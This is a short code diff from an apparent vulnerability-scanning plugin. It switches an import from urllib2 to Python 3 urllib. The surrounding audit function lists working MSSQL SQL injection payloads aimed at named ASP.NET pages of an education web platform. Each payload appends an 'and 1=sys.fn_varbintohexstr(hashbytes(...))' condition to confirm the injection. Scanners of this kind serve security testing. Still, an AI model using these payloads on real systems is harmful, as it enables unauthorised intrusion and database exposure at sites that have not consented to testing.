@@ -11,7 +11,7 @@ def assign(service, arg):
 
 
 def audit(arg):
-    import urllib2
+    import urllib.request, urllib.error, urllib.parse
     payloads = ['DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx?ClsID=4012&KindID=%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',\
     'dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=1%20AND%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',\
     'dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',\
